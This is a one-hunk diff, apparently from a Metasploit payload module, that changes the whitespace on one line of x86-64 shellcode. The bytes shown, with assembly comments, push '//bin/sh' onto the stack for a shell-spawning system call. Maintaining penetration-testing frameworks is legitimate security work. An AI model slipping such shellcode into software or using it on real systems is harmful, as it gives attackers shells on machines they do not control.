@@ -69,7 +69,7 @@ module Metasploit3
             "\x0f\x05"             +#  	syscall                            #
             "\x52"                 +# 	push   %rdx                        #
             "\x48\xbf\x2f\x2f\x62" +#   mov "//b"                          #
-	    "\x69\x6e\x2f\x73\x68" +# 	mov "in/sh",%rdi                   #
+            "\x69\x6e\x2f\x73\x68" +# 	mov "in/sh",%rdi                   #
             "\x57"                 +#	push   %rdi                        #
             "\x48\x89\xe7"         +# 	mov    %rsp,%rdi                   #
             "\x52"                 +# 	push   %rdx                        #
